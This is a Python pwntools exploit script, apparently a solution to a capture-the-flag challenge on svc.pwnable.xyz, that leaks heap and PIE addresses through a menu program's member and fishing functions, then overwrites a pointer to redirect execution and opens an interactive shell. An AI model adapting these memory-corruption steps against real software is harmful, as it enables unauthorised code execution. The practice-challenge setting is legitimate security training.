from pwn import *

def add_member(name, job, age):
	sh.sendlineafter('> ', '1')
	sh.sendlineafter(': ', name)
	sh.sendlineafter(': ', job)
	sh.sendlineafter(': ', str(age))



def go_fishing():
	sh.sendlineafter('> ', '4')

def write_book(message):
	sh.sendline('3')
	sh.sendafter('?\n', message)




#sh = process('./challenge')
sh = remote('svc.pwnable.xyz', 30045)


add_member('AAAA', 'BBBB', 20)

add_member('AAAA', 'BBBB', 20)


#sh.sendline('3')
#sh.sendafter('?\n', 'AAAAAAAA')
add_member('CCCC', 'DDDD', 20)

go_fishing()
sleep(1)
sh.sendline('5')
sleep(1)

go_fishing()
sleep(1)
sh.sendline('5')
sleep(1)




sh.sendline('1')
sh.sendafter(': ', '\x40')
sh.sendlineafter(': ', 'H')
sh.sendlineafter(': ', str(20))

go_fishing()
sh.recvuntil('!!!\n')
heap_addr = u64(sh.recvuntil('h')[0:6].ljust(8, '\x00'))
print "heap = ", hex(heap_addr)
sleep(1)
sh.sendline('5')
sleep(1)


sh.sendline('3')
sh.sendafter('?\n', p64(heap_addr))
sh.sendlineafter('> ', '2')
sh.sendlineafter('?\n', '2')
sh.sendafter(': ', '\x10')
sh.sendlineafter(': ', 'a')
sh.sendlineafter(': ', '20')
'''
#add member
sh.sendline('1')
sh.sendlineafter(': ', 'AAAA')
sh.sendlineafter(': ', 'BBBB')
sh.sendlineafter(': ', str(20))
'''
go_fishing()
sh.recvuntil('!!!\n')
pie_addr = u64(sh.recvuntil('h')[0:6].ljust(8, '\x00')) - 0x156a
print "pie = ", hex(pie_addr)
sleep(1)
sh.sendline('5')
sleep(1)


pause()
sh.sendline('3')
pause()
sh.sendafter('?\n', p64(pie_addr + 0x202098))
pause()
sh.sendlineafter('> ', '2')
pause()
sh.sendlineafter('?\n', '1')
sh.sendafter(': ', p64(pie_addr + 0xfc0))
sh.sendlineafter(': ', 'a')
sh.sendlineafter(': ', '20')

sh.interactive()

